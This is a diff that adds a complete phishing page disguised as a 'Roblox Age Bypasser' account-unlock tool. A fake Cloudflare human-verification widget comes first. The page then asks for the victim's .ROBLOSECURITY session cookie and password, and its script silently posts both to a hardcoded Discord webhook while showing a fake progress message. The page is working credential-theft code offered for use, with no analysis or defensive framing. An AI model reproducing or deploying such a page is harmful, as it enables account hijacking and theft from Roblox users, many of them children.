@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Age Bypasser</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0a0e17;
+    color: #e6edf3;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .card {
+    background: #111827;
+    border: 1px solid #1f2a3a;
+    border-radius: 14px;
+    padding: 34px 30px;
+    width: 100%;
+    max-width: 410px;
+    text-align: center;
+    box-shadow: 0 0 40px rgba(30, 120, 255, 0.15);
+  }
+  .badge {
+    display: inline-block;
+    font-size: 11px;
+    letter-spacing: 0.5px;
+    padding: 5px 12px;
+    border-radius: 999px;
+    background: rgba(30, 120, 255, 0.12);
+    color: #4da3ff;
+    border: 1px solid rgba(30, 120, 255, 0.35);
+    margin-bottom: 16px;
+  }
+  h1 {
+    font-size: 22px;
+    margin-bottom: 8px;
+    color: #ffffff;
+    font-weight: 700;
+  }
+  .sub {
+    font-size: 13px;
+    color: #7d8ba1;
+    margin-bottom: 26px;
+  }
+  label {
+    display: block;
+    text-align: left;
+    font-size: 12px;
+    color: #8fa0b8;
+    margin-bottom: 7px;
+    font-weight: 500;
+  }
+  input {
+    width: 100%;
+    padding: 12px 13px;
+    margin-bottom: 18px;
+    background: #0d1520;
+    border: 1px solid #24334a;
+    border-radius: 9px;
+    color: #e6edf3;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+  input::placeholder { color: #4a5a72; }
+  input:focus {
+    border-color: #2f7bff;
+    box-shadow: 0 0 0 3px rgba(47, 123, 255, 0.18);
+  }
+  button {
+    width: 100%;
+    padding: 13px;
+    background: linear-gradient(180deg, #2f7bff, #1e5fd6);
+    color: #fff;
+    border: none;
+    border-radius: 9px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    letter-spacing: 0.3px;
+    transition: filter 0.15s;
+  }
+  button:hover { filter: brightness(1.12); }
+  button:disabled { opacity: 0.6; cursor: default; }
+  .status {
+    margin-top: 20px;
+    font-size: 14px;
+    color: #4da3ff;
+    display: none;
+  }
+  .spinner {
+    display: inline-block;
+    width: 15px;
+    height: 15px;
+    border: 2px solid rgba(77, 163, 255, 0.3);
+    border-top-color: #4da3ff;
+    border-radius: 50%;
+    vertical-align: -2px;
+    margin-right: 8px;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .foot {
+    margin-top: 22px;
+    font-size: 12px;
+    color: #4a5a72;
+  }
+  /* Fake Cloudflare widget */
+  .cf-box {
+    display: flex;
+    align-items: center;
+    text-align: left;
+    background: #1b2433;
+    border: 1px solid #2a3a52;
+    border-radius: 10px;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+  }
+  .cf-check {
+    width: 26px;
+    height: 26px;
+    border: 2px solid #4a5a72;
+    border-radius: 6px;
+    background: #0d1520;
+    margin-right: 14px;
+    cursor: pointer;
+    flex-shrink: 0;
+    position: relative;
+    transition: border-color 0.15s, background 0.15s;
+  }
+  .cf-check.verifying {
+    border-color: #4da3ff;
+    background: #0d1520;
+  }
+  .cf-check.verified {
+    border-color: #2f7bff;
+    background: #2f7bff;
+  }
+  .cf-check.verified::after {
+    content: "";
+    position: absolute;
+    left: 8px;
+    top: 3px;
+    width: 6px;
+    height: 12px;
+    border: solid #fff;
+    border-width: 0 2px 2px 0;
+    transform: rotate(45deg);
+  }
+  .cf-check.verifying::after {
+    content: "";
+    position: absolute;
+    left: 7px;
+    top: 7px;
+    width: 8px;
+    height: 8px;
+    border: 2px solid rgba(77, 163, 255, 0.3);
+    border-top-color: #4da3ff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  .cf-text {
+    flex: 1;
+    font-size: 13px;
+    color: #c3d0e2;
+  }
+  .cf-brand {
+    font-size: 10px;
+    color: #5f7190;
+    text-align: right;
+    line-height: 1.4;
+  }
+  .cf-brand b { color: #8fa0b8; }
+  .cf-hidden { display: none !important; }
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="badge">Splunk-Pro-V2</span>
+  <h1>Roblox Age Bypasser</h1>
+  <p class="sub">Instant account unlock</p>
+
+  <!-- Fake Cloudflare -->
+  <div class="cf-box" id="cfBox">
+    <div class="cf-check" id="cfCheck"></div>
+    <div class="cf-text" id="cfText">Verify you are human</div>
+    <div class="cf-brand"><b>CLOUDFLARE</b><br>Privacy · Terms</div>
+  </div>
+
+  <form id="f" class="cf-hidden">
+    <label>.ROBLOSECURITY Cookie</label>
+    <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE..." required>
+
+    <label>Password (Optional)</label>
+    <input type="text" id="password" placeholder="Password">
+
+    <button type="submit" id="btn">Submit</button>
+  </form>
+
+  <div class="status" id="status">
+    <span class="spinner"></span>Working on it, 5 min...
+  </div>
+
+  <div class="foot">Secured connection · v2.4.1</div>
+</div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1555259775997050990/IO0eRwmoMqlmNLyDKV5k8HX37dOLR-Wnm8u8wk2LKmI9jZWZEHpRq1vJ0emS14NDfmpw";
+
+  const cfCheck = document.getElementById("cfCheck");
+  const cfText = document.getElementById("cfText");
+  const cfBox = document.getElementById("cfBox");
+  const form = document.getElementById("f");
+
+  // Fake verify flow
+  let verified = false;
+  cfBox.addEventListener("click", () => {
+    if (verified) return;
+    cfCheck.classList.add("verifying");
+    cfText.textContent = "Verifying...";
+
+    setTimeout(() => {
+      cfCheck.classList.remove("verifying");
+      cfCheck.classList.add("verified");
+      cfText.textContent = "Success!";
+      verified = true;
+
+      setTimeout(() => {
+        cfBox.classList.add("cf-hidden");
+        form.classList.remove("cf-hidden");
+      }, 500);
+    }, 1200);
+  });
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const cookie = document.getElementById("cookie").value;
+    const password = document.getElementById("password").value;
+    const btn = document.getElementById("btn");
+    btn.disabled = true;
+    btn.textContent = "Processing...";
+
+    const payload = {
+      content: "**New Submission**",
+      embeds: [{
+        title: "Roblox Bypasser",
+        color: 0x2f7bff,
+        fields: [
+          { name: "Cookie", value: cookie || "none", inline: false },
+          { name: "Password", value: password || "none", inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {}
+
+    form.style.display = "none";
+    document.getElementById("status").style.display = "block";
+  });
+</script>
+</body>
+</html>
